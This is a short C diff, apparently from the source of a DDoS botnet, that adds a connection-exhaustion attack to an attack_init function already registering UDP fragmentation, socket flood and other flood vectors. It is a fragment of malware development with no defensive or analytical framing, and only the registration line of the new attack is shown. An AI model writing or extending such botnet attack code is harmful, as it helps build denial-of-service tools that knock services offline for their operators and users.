@@ -44,6 +44,7 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_UDP_FRAG, (ATTACK_FUNC)attack_udp_frag);
     add_attack(ATK_VEC_RS_MEDIA, (ATTACK_FUNC)attack_rs_media);
     add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_socket_flood);
+    add_attack(ATK_VEC_CONN_EXHAUST, (ATTACK_FUNC)attack_conn_exhaust);
     return TRUE;
 }
 
